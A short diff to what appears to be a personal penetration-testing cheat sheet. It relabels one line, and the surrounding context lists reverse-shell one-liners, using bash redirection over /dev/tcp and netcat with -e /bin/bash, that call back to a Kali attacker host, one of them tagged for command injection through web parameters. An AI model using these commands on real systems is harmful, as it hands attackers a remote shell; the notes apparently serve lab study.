@@ -151,7 +151,7 @@ Kali port:
  - Linux `echo $0`  
     - /bin/sh  
     - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
-    - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
+    - Restricted sh/command injection/web param: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`  
     - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
   - Windows `echo %COMSPEC%`  
     - cmd.exe  
